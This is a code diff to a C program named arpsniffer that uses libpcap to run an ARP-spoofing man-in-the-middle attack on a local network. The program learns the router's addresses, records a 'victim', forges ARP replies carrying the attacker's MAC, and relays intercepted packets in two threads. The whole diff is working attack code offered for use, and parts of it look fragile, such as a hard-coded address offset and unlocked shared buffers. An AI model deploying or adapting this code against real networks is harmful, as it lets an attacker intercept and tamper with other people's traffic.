@@ -10,6 +10,7 @@ So when compile it, write instruction like 'gcc -o arpsniffer arpsniffer.c -lpth
 And this program execute, write instruction like './arpsniffer arp'
 */
 #include <pcap.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
@@ -29,7 +30,8 @@ void print_packet(int len, u_char *packet);		// packet print function
 void mac_filter(u_char *mac, unsigned long long tmp);	// my_ethernet_address deduct function
 void swap(u_char *A, u_char *B);		// packet swapping
 int flag_check(u_char *a, u_char *b);	// compare with each of u_char value
-void * relay_test(void * arg);			// it is thread.
+void * relay_request(void * arg);			// it is thread.
+void * relay_reply(void * arg);
 
 // used by thread
 pcap_t *pcap;
@@ -40,6 +42,7 @@ pthread_t thread;
 
 // saving each of address
 u_char my_mac[6];
+u_char my_ip[4];
 u_char router_mac[6];
 u_char router_ip[4];
 u_char victim_mac[6];
@@ -111,10 +114,13 @@ int main(int argc, char *argv[]) {
 	s = socket(AF_INET, SOCK_DGRAM, 0);
 	strcpy(ifr.ifr_name, alldevs->name);
 	ioctl(s, SIOCGIFHWADDR, &ifr);
-	for (i = 0; i < ETHER_ADDR_LEN; i++)
+	for(i = 0; i < ETHER_ADDR_LEN; i++)
 		sprintf(&mac[i*2],"%02x",((u_char*)ifr.ifr_hwaddr.sa_data)[i]);
 	mac[13] = '\0';
 	mac_filter(mac, tmp);		// owner's mac address
+
+	for(i = 0; i < 4; i++) 
+		*(my_ip+i) = *(alldevs->addresses->addr->sa_data+i+146);
 
 	// Look up info from the capture device.
 	if(pcap_lookupnet(alldevs->name , &netp, &maskp, errbuf) == -1) {
@@ -141,7 +147,7 @@ int main(int argc, char *argv[]) {
 		fprintf(stderr, "ERROR: %s\n", pcap_geterr(pcap) );
 		exit(1);
 	}
-	pcap_loop(pcap, -1, callback, NULL);	// pcap_loop start!!
+	pcap_loop(pcap, -1,(pcap_handler)callback, NULL);	// pcap_loop start!!
 }
 
 void callback(u_char *useless, const struct pcap_pkthdr *pkthdr, u_char *packet) {
@@ -153,7 +159,8 @@ void callback(u_char *useless, const struct pcap_pkthdr *pkthdr, u_char *packet)
 	
 	if(thread == 0) {		// beginning thread value is zero. After thread create, thread value is random
 		pthread_mutex_init(&mutx, NULL);
-		pthread_create(&thread, NULL, (void *)relay_test, NULL);	// relay_test function is working to thread
+		pthread_create(&thread, NULL, (void *)relay_request, NULL);	// relay_request function is working to thread
+		pthread_create(&thread, NULL, (void *)relay_reply, NULL);	// relay_reply function is working to thread
 	}
 
 	eth = (struct libnet_ethernet_hdr *)packet;
@@ -202,55 +209,62 @@ void callback(u_char *useless, const struct pcap_pkthdr *pkthdr, u_char *packet)
 	// deduct router's mac address. First, owner's arp table delete. Next, arp packet sended to router automatically. Then we can get router's mac address.
 	// arp_reply packet & owner mac address is correct with packet's ethernet destination mac address
 	// Also, packet's sender mac address isn't correct with packet's target mac address. Because of own packet is comeback!
-	if(ntohs(arpheader->oper) == ARPOP_REPLY && flag_check(eth->ether_dhost, my_mac) != 1 && flag_check(arpheader->sha, arpheader->tha) == 1 && *router_mac == 0)
-		for(i = 0; i < ETHER_ADDR_LEN; i++)
+	if(ntohs(arpheader->oper) == ARPOP_REPLY && flag_check(eth->ether_dhost, my_mac) != 1 && flag_check(arpheader->sha, arpheader->tha) == 1 && *router_mac == 0) {
+		printf("\nGot the Router's Mac : ");
+		for(i = 0; i < ETHER_ADDR_LEN; i++) 
 			*(router_mac+i) = *(packet + sizeof(eth->ether_dhost) + i);
+		mac_print((u_int8_t *)router_mac);
+	}
 	
 	// very long if statement.
 	// only request packet & target mac address is broadcast & must not enter to router & must not enter to same ip & must not enter to own sending packet
 	if(ntohs(arpheader->oper) == ARPOP_REQUEST && flag_check(eth->ether_dhost, br_f) != 1 && flag_check(arpheader->tha, br_0) != 1 && flag_check(arpheader->sha, router_mac) == 1 && *(arpheader->spa+3) != *(arpheader->tpa+3) && flag_check(arpheader->sha, my_mac) == 1) {
-		if(*router_ip == 0)		// save to router ip address
-			for(i = 0; i < 4; i++)
+		if(*router_ip == 0) {		// save to router ip address
+			printf("\nGot the Router's IP : ");
+			for(i = 0; i < 4; i++) {
 				*(router_ip+i) = *(arpheader->tpa+i);
-
-		for(i = 0; i < ETHER_ADDR_LEN; i++) *(victim_mac+i) = *(arpheader->sha+i);	// save to victim mac address
-		for(i = 0; i < 4; i++) *(victim_ip+i) = *(arpheader->spa+i);		// save to victim ip address
-
-		sleep(1);	// After send to router's reply packet
-		printf("\n\nPacket Changing...\n");
-		for(i = 0; i < ETHER_ADDR_LEN; i++) {
-			*(packet+i) = *(my_mac+i);
-			swap(packet+i, packet+(i+ETHER_ADDR_LEN));
+				printf("%d.", *(router_ip+i));
+			}
 		}
 
-		packet += size;
-		*(packet+1) = ARPOP_REPLY;
-		packet += sizeof(arpheader->oper);
-		for(i = 0; i < 10; i++) {
-			if(i < ETHER_ADDR_LEN) *(packet+(i+10)) = *(my_mac+i);
-			swap(packet+i, packet+(i+10));
-		}
-		packet -= size + sizeof(arpheader->oper);
-		printf("Packet Change Success!!\nChanged Packet Sending...\n");
-		pcap_sendpacket(pcap, packet, length);
-		printf("Packet Send Success!!\nYour atk_packet is..\n");
-		print_packet(length, packet);
+		if(*(router_ip+3)==*(arpheader->tpa+3)) {
+			for(i = 0; i < ETHER_ADDR_LEN; i++) *(victim_mac+i) = *(arpheader->sha+i);	// save to victim mac address
+			for(i = 0; i < 4; i++) *(victim_ip+i) = *(arpheader->spa+i);		// save to victim ip address
 
-		packet += size;
-		*(packet+1) = ARPOP_REQUEST;
-		packet += sizeof(arpheader->oper) + sizeof(arpheader->sha) + sizeof(arpheader->spa);
-		for(i = 0; i < ETHER_ADDR_LEN; i++) *(packet+i) = *(br_0+i);
-		packet -= size + sizeof(arpheader->oper) + sizeof(arpheader->sha) + sizeof(arpheader->spa);
-		printf("\nSend a Request Packet to victim...\n");
-		pcap_sendpacket(pcap, packet, length);
-		printf("Request Success!!\nYour request packet is..\n");
-		print_packet(length, packet);
+			printf("\n\nPacket Changing...\n");
+			for(i = 0; i < ETHER_ADDR_LEN; i++) {
+				*(packet+i) = *(my_mac+i);
+				swap(packet+i, packet+(i+ETHER_ADDR_LEN));
+			}
+
+			packet += size;
+			*(packet+1) = ARPOP_REPLY;
+			packet += sizeof(arpheader->oper);
+			for(i = 0; i < 10; i++) {
+				if(i < ETHER_ADDR_LEN) *(packet+(i+10)) = *(my_mac+i);
+				swap(packet+i, packet+(i+10));
+			}
+			packet -= size + sizeof(arpheader->oper);
+			printf("Packet Change Success!!\nChanged Packet Sending...\n");
+			pcap_sendpacket(pcap, packet, length);
+			printf("Packet Send Success!!\nYour atk_packet is..\n");
+			print_packet(length, packet);
+
+			packet += size;
+			*(packet+1) = ARPOP_REQUEST;
+			packet += sizeof(arpheader->oper) + sizeof(arpheader->sha) + sizeof(arpheader->spa);
+			for(i = 0; i < ETHER_ADDR_LEN; i++) *(packet+i) = *(br_0+i);
+			packet -= size + sizeof(arpheader->oper) + sizeof(arpheader->sha) + sizeof(arpheader->spa);
+			printf("\nSend a Request Packet to victim...\n");
+			pcap_sendpacket(pcap, packet, length);
+			printf("Request Success!!\nYour request packet is..\n");
+			print_packet(length, packet);
+		}
 	}
 
 	// it is send packet to router for router's table change
 	if(ntohs(arpheader->oper) == ARPOP_REQUEST && flag_check(eth->ether_shost, router_mac) != 1 && flag_check(arpheader->sha, router_mac) != 1) {
 		printf("\nRouter's Broadcast Receive!!\nPacket Creating..\n");
-		sleep(1);	// After send to router's reply packet
 
 		for(i = 0; i < ETHER_ADDR_LEN; i++) {
 			*(packet+i) = *(my_mac+i);
@@ -316,16 +330,14 @@ int flag_check(u_char *a, u_char *b) {	// compare with mac address
 	return value;
 }
 
-void * relay_test(void * arg) {	// thread function
+void * relay_request(void * arg) {	// thread function
 	int i = 0, length = 0;
 	struct arphdr *arph;
 	struct libnet_ethernet_hdr *ether;
 	while(1) {
-		pthread_mutex_lock(&mutx);
 		length = hdr->len;
 		ether = (struct libnet_ethernet_hdr *)pkt;
 		arph = (struct arphdr *)(pkt + sizeof(struct libnet_ethernet_hdr));
-		pthread_mutex_unlock(&mutx);
 
 		// victim is send to owner by request packet, this if-statement work.
 		if(ntohs(arph->oper) == ARPOP_REQUEST && flag_check(ether->ether_dhost, my_mac) != 1 && *(arph->tpa+3) == *(router_ip+3)) {
@@ -347,12 +359,21 @@ void * relay_test(void * arg) {	// thread function
 
 			printf("\nSend a packet to Router in Thread..\n");
 			pcap_sendpacket(pcap, pkt, length);
-			print_packet(length, pkt);
-			sleep(1);
 		}
-		
+	}	
+	pthread_cancel(thread);
+}
+
+void * relay_reply(void * arg) {
+	int i = 0, length = 0;
+	struct arphdr *arph;
+	struct libnet_ethernet_hdr *ether;
+	while(1) {
+		length = hdr->len;
+		ether = (struct libnet_ethernet_hdr *)pkt;
+		arph = (struct arphdr *)(pkt + sizeof(struct libnet_ethernet_hdr));
 		// router is send to owner by reply packet, this if-statement work.
-		if(ntohs(arph->oper) == ARPOP_REPLY && flag_check(ether->ether_dhost, my_mac) != 1 && *(arph->tpa+3) == *(victim_ip+3)) {
+		if(ntohs(arph->oper) == ARPOP_REPLY && flag_check(ether->ether_dhost, my_mac) != 1 && *(arph->tpa+3) != *(my_ip+3)) {
 			for(i = 0; i < ETHER_ADDR_LEN; i++) *(pkt+i) = *(victim_mac+i);
 			
 			pkt += sizeof(ether->ether_dhost);
@@ -371,8 +392,6 @@ void * relay_test(void * arg) {	// thread function
 
 			printf("\nSend a packet to Router in Thread..\n");
 			pcap_sendpacket(pcap, pkt, length);
-			print_packet(length, pkt);
-			sleep(1);
 		}
 	}
 	pthread_cancel(thread);
